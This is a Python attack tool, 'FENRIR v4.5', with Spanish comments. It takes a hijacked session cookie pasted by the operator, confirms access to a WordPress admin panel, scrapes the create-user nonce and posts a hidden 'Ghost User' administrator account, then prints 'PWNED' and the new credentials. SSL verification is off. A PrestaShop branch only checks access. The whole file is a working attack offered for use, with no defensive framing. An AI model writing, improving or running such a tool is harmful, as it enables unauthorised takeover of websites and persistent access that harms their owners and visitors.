import asyncio
import aiohttp
import sys
import re
import time
import logging
import functools
from dataclasses import dataclass, field
from typing import Optional, Dict, Any, Callable
from enum import Enum, auto
from yarl import URL

# ==============================================================================
#  🛠️ CONFIGURACIÓN & UTILS (ARCHITECT LEVEL)
# ==============================================================================

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"

# --- DECORATORS ---

def operation_guard(func: Callable[..., Any]) -> Callable[..., Any]:
    """
    Decorador Senior: Maneja excepciones, mide tiempos y mantiene el core limpio.
    """
    @functools.wraps(func)
    async def wrapper(*args, **kwargs):
        start_time = time.perf_counter()
        func_name = func.__name__.replace('_', ' ').upper()
        try:
            print(colorize(f"   ⚙️  Iniciando: {func_name}...", Colors.CYAN))
            result = await func(*args, **kwargs)
            elapsed = time.perf_counter() - start_time
            print(colorize(f"   ✅ {func_name} completado en {elapsed:.2f}s", Colors.GREEN))
            return result
        except Exception as e:
            print(colorize(f"   ❌ ERROR CRÍTICO en {func_name}: {str(e)}", Colors.RED))
            return None
    return wrapper

# --- DATA STRUCTURES ---

class TargetType(Enum):
    WORDPRESS = auto()
    PRESTASHOP = auto()

@dataclass
class UserPayload:
    """DTO inmutable para transportar los datos del nuevo admin."""
    username: str
    password: str
    email: str
    role: str = "administrator"

@dataclass
class TargetConfig:
    base_url: str
    type: TargetType
    user_agent: str
    timeout: int = 20
    cookies: Dict[str, str] = field(default_factory=dict)

# ==============================================================================
#  🦍 CORE ENGINE: FENRIR v4.5
# ==============================================================================

class FenrirEngine:
    """
    Engine asíncrono gestionado por Context Managers.
    Obsesión por la limpieza de sesiones y manejo de recursos.
    """
    def __init__(self, config: TargetConfig):
        self.config = config
        self.session: Optional[aiohttp.ClientSession] = None
        
    async def __aenter__(self) -> "FenrirEngine":
        jar = aiohttp.CookieJar(unsafe=True)
        # Inyección inicial de cookies en el Jar
        if self.config.cookies:
            url_obj = URL(self.config.base_url)
            jar.update_cookies(self.config.cookies, response_url=url_obj)

        self.session = aiohttp.ClientSession(
            base_url=self.config.base_url,
            connector=aiohttp.TCPConnector(ssl=False),
            cookie_jar=jar,
            headers={"User-Agent": self.config.user_agent},
            timeout=aiohttp.ClientTimeout(total=self.config.timeout)
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def verify_access(self, path: str) -> bool:
        """Verifica si la sesión inyectada es válida antes de atacar."""
        if not self.session: return False
        
        full_url = f"{self.config.base_url.rstrip('/')}/{path.lstrip('/')}"
        print(f"\n🕵️  Verificando acceso a: {colorize(full_url, Colors.BOLD)}")

        try:
            async with self.session.get(path, allow_redirects=True) as resp:
                content = await resp.text()
                real_url = str(resp.url)
                
                is_success = False
                
                # Lógica de detección según CMS
                if self.config.type == TargetType.WORDPRESS:
                    # Éxito si estamos en wp-admin y NO en wp-login
                    if "wp-login.php" not in real_url and ("wp-admin" in real_url or "wp-admin-bar" in content):
                        is_success = True
                        
                elif self.config.type == TargetType.PRESTASHOP:
                    if "login" not in real_url.lower() and any(k in content for k in ["logout", "employee_box", "PrestaShop"]):
                        is_success = True

                if is_success:
                    print(f"   {colorize('🔥 ACCESO CONFIRMADO: Cookies válidas.', Colors.GREEN)}")
                    return True
                else:
                    print(f"   {colorize('❄️  ACCESO DENEGADO (Rebote al Login). Revisa tus cookies.', Colors.RED)}")
                    return False
                    
        except Exception as e:
            print(f"❌ Error de conexión: {e}")
            return False

    @operation_guard
    async def deploy_user(self, payload: UserPayload) -> bool:
        """Router de estrategias."""
        if self.config.type == TargetType.WORDPRESS:
            return await self._exploit_wordpress(payload)
        elif self.config.type == TargetType.PRESTASHOP:
            return await self._exploit_prestashop(payload)
        return False

    # --- STRATEGIES ---

    async def _exploit_wordpress(self, payload: UserPayload) -> bool:
        """
        Estrategia WP V3 (Deep Search & Permission Check).
        """
        if not self.session: return False
        target_path = "/wp-admin/user-new.php"
        
        print(colorize("   🔍 Escaneando user-new.php en busca del Nonce...", Colors.YELLOW))
        
        async with self.session.get(target_path) as resp:
            text = await resp.text()
            
            # --- DEBUG: BLACK BOX RECORDER ---
            # Guardamos la evidencia SIEMPRE para diagnóstico
            with open("debug_view.html", "w", encoding="utf-8") as f: f.write(text)

            # 1. CHECK DE PERMISOS
            # Si el usuario no es Admin total, WP suele mostrar mensajes específicos
            if "wp-die-message" in text or "permissions" in text.lower() or "cheatin" in text.lower():
                print(colorize("   ⛔ ALERTA DE ROL: La cookie es válida, pero el usuario NO es Administrador.", Colors.RED))
                print(colorize("      Es probable que sea Editor, Shop Manager o Author. No puedes crear usuarios.", Colors.YELLOW))
                return False

            # 2. BÚSQUEDA PROFUNDA DE NONCE (Multi-Pattern)
            nonce = None
            patterns = [
                # Patrón A: Standard (name="... " value="...")
                r'name="_wpnonce_create-user"\s+value="([^"]+)"',
                # Patrón B: Invertido (value="..." name="...")
                r'value="([^"]+)"\s+name="_wpnonce_create-user"',
                # Patrón C: Sucio/Laxo (Cualquier cosa en medio)
                r'name="_wpnonce_create-user"[^>]+value="([^"]+)"',
                # Patrón D: ID based (A veces usan ID para JS)
                r'id="_wpnonce_create-user"\s+value="([^"]+)"'
            ]

            for pattern in patterns:
                match = re.search(pattern, text)
                if match:
                    nonce = match.group(1)
                    break # Encontrado, salimos del loop
            
            if nonce:
                print(f"   🔑 Nonce capturado: {colorize(nonce, Colors.MAGENTA)}")
            else:
                print(colorize("   ❌ FATAL: No se encontró el formulario de creación.", Colors.RED))
                print("      - He guardado lo que ve el bot en 'debug_view.html'.")
                print("      - Abre ese archivo en tu navegador. Si no ves el formulario, el usuario no tiene permisos.")
                return False

        # 3. ATAQUE (POST)
        data = {
            "action": "createuser",
            "_wpnonce_create-user": nonce,
            "user_login": payload.username,
            "email": payload.email,
            "first_name": "Ghost",
            "last_name": "User",
            "url": "",
            "pass1": payload.password,
            "pass2": payload.password,
            "role": payload.role,
            "createuser": "Add New User"
        }
        
        print(colorize(f"   🚀 Ejecutando inyección de Admin: {payload.username}...", Colors.YELLOW))
        async with self.session.post(target_path, data=data) as resp:
            res_text = await resp.text()
            
            # Análisis heurístico de éxito
            # Si nos redirige a users.php (lista de usuarios) es la señal definitiva de éxito
            if "users.php" in str(resp.url) and "user-new.php" not in str(resp.url):
                return True
                
            # Fallback check en el texto
            if "New user created" in res_text or "usuario creado" in res_text:
                return True

            # Análisis de error
            if "error" in res_text.lower():
                err_match = re.search(r'<div id="message" class="error"><p>(.*?)</p></div>', res_text)
                err_msg = err_match.group(1) if err_match else "Error genérico (Revisa debug_view.html)"
                print(colorize(f"   ⚠️  El servidor rechazó la creación: {err_msg}", Colors.RED))
                return False
                
            return True

    async def _exploit_prestashop(self, payload: UserPayload) -> bool:
        print(colorize("   ⚠️  PRESTASHOP: Funcionalidad limitada por arquitectura.", Colors.YELLOW))
        print("   Razón: Requiere parsing dinámico de tokens en URLs del Dashboard.")
        return False

# ==============================================================================
#  🎮 INTERFAZ CLI
# ==============================================================================

def parse_raw_cookies(raw_cookie: str) -> Dict[str, str]:
    """Parser robusto para strings de cookies copiados del navegador."""
    cookies = {}
    raw_cookie = raw_cookie.strip()
    if raw_cookie.lower().startswith("cookie:"):
        raw_cookie = raw_cookie[7:].strip()
        
    parts = raw_cookie.split(";")
    for part in parts:
        if "=" in part:
            key, value = part.strip().split("=", 1)
            cookies[key] = value
    return cookies

async def main():
    print(colorize("\n🦍 FENRIR v4.5 - ADMIN INJECTION ARCHITECT 🦍\n", Colors.RED))

    # 1. SETUP
    url_input = input(">> URL Base (Raíz): ").strip()
    if not url_input.startswith("http"): url_input = f"http://{url_input}"
    if not url_input.endswith("/"): url_input += "/"
    
    print("\n[1] WordPress (Estable)\n[2] PrestaShop (Solo Check)")
    choice = input(">> Opción: ").strip()
    target_type = TargetType.WORDPRESS if choice == '1' else TargetType.PRESTASHOP

    # 2. COOKIES
    print(f"\n{Colors.YELLOW}👉 COOKIE SESSION HIJACK{Colors.RESET}")
    print("   Pega la cookie completa (Key=Value; Key2=Value2...):")
    raw_cookie = input("   >> ").strip()
    cookie_dict = parse_raw_cookies(raw_cookie)
    
    if not cookie_dict:
        print(colorize("❌ No se detectaron cookies válidas. Abortando.", Colors.RED))
        return

    # 3. MODO
    print(f"\n{Colors.MAGENTA}⚔️  MODO DE ATAQUE{Colors.RESET}")
    print("   [1] Recon (Solo verificar acceso)")
    print("   [2] Exploit (Crear Admin)")
    mode = input("   >> ").strip()

    # Configuración Inmutable
    config = TargetConfig(
        base_url=url_input, 
        type=target_type, 
        user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        cookies=cookie_dict
    )

    async with FenrirEngine(config) as engine:
        # Verificar Acceso
        default_path = "/wp-admin/" if target_type == TargetType.WORDPRESS else "/admin-dev/"
        has_access = await engine.verify_access(default_path)
        
        if has_access and mode == '2':
            if target_type == TargetType.PRESTASHOP:
                print(colorize("❌ Módulo PrestaShop deshabilitado por seguridad.", Colors.RED))
            else:
                print(f"\n{Colors.CYAN}👤 CONFIGURACIÓN DEL GHOST USER{Colors.RESET}")
                u_user = input("   User: ").strip()
                u_email = input("   Email: ").strip()
                u_pass = input("   Pass: ").strip()
                
                payload = UserPayload(username=u_user, email=u_email, password=u_pass)
                
                success = await engine.deploy_user(payload)
                if success:
                     print(f"\n{colorize('💀 PWNED: Usuario Administrador Creado.', Colors.GREEN)}")
                     print(f"   Credenciales: {u_user} / {u_pass}")
                     print(f"   Login: {url_input}wp-admin/")
                else:
                     print(f"\n{colorize('🛡️ FAILED: No se pudo inyectar el usuario.', Colors.RED)}")

if __name__ == "__main__":
    if sys.platform == 'win32': 
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Operación cancelada.")